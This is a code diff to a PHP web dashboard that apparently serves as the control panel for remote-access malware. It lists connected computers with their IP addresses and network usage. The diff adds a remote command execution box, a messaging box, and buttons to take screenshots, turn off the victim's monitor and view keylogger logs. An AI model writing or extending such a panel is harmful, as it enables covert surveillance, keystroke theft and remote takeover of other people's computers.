@@ -13,6 +13,15 @@
 
      
       <style>
+        .actions {
+          display:inline-block; border:1px solid yellow; background: green; cursor:pointer;
+          padding: 5px;
+        }
+        .actions:hover {
+          background: orange;
+          color: black;
+        }
+
       #proc td {
         width: 20px;
       }
@@ -42,7 +51,14 @@
 
       </style>
       
-     <script> setTimeout(function() { window.location.reload(true); }, 5000); </script>
+     <script> 
+     var lastUserAction = 0;
+
+     setInterval(function() {
+       console.log("Checking last action time... " + new Date() - lastUserAction);
+      if(new Date() - lastUserAction > 5000)
+        window.location.reload(true);
+      }, 5000); </script>
 
   </head>
   <body>
@@ -182,7 +198,7 @@
                         </div>
                         <br/><br/><br/>
                         <div class="block">
-                          <span class="blockhead"><img src="img/net.png"/>  Network Usage</span>
+                          <span class="blockhead"><img src="img/net.png"/>Wi-Fi  Network Usage</span>
                           <span class="blockbody">
                           <?php 
                           echo "Bytes Sent: " . array_values($obj)[$id]["nu"]["sent"] . " Bytes";
@@ -208,9 +224,57 @@
 
                         <br/><br/><br/>
                         <div class="block">
+                          <span class="blockhead"><img src="img/net.png"/>Ethernet Network Usage</span>
+                          <span class="blockbody">
+                          <?php 
+                          echo "Bytes Sent: " . array_values($obj)[$id]["enu"]["sent"] . " Bytes";
+                          echo "<br/>";
+                          echo "Bytes received: " . array_values($obj)[$id]["enu"]["received"] . " Bytes";
+                          
+                          $per0 = array_values($obj)[$id]["enu"]["sent"] / 10000000; 
+                          $per1 = array_values($obj)[$id]["enu"]["received"] / 10000000; 
+                          ?>
+                          </span>
+
+                          <div class="progress">
+                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["enu"]["sent"] ?>"
+                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per0; ?>%">
+                            </div>
+                          </div>
+                          <div class="progress">
+                            <div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="<?php echo array_values($obj)[$id]["enu"]["received"] ?>"
+                            aria-valuemin="0" aria-valuemax="1000000000" style="width:<?php echo $per1; ?>%">
+                            </div>
+                          </div>
+                        </div>
+
+                        <br/><br/><br/>
+                        <div class="block">
                           <span class="blockhead"><img src="img/net.png"/>  Remote Command Execution</span>
                           <span class="blockbody" style="width:100%">
                             <input style="color:black;width:100%" id="spawner" placeholder="Enter a command to execute on the remote computer..." ></input>
+                          </span>
+
+                          
+                        </div>
+
+                        <br/><br/><br/>
+                        <div class="block">
+                          <span class="blockhead"><img src="img/alert.png"/>  Send Alert/Message</span>
+                          <span class="blockbody" style="width:100%">
+                            <input style="color:black;width:100%" id="messagesender" placeholder="Enter a message to send to the remote computer..." ></input>
+                          </span>
+
+                          
+                        </div>
+
+                         <br/><br/><br/>
+                        <div class="block">
+                          <span class="blockhead"><img src="img/act.png"/>  Remote Actions</span>
+                          <span class="blockbody" style="width:100%">
+                            <div class='actions' id="takescreenshotbutton">Take a screenshot</div>
+                            <div class='actions' id="monitoroffbutton">Turn off monitor</div>
+                            <div class='actions' id="keyloggerviewbutton">View Keylogger logs</div>
                           </span>
 
                           
@@ -274,12 +338,12 @@
     $dump = file_get_contents("server/client.dump");
     $obj = json_decode($dump, true);
     $pcname =  array_values($obj)[$pccount]["id"];
-
+    $ipaddr =  array_values($obj)[$pccount]["ip"];
     ?>
 
     var pcid = <?php echo $pccount; ?>;
     var pcname = "<?php echo $pcname; ?>";
-    
+    var pcip = "<?php echo $ipaddr; ?>";
     </script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 
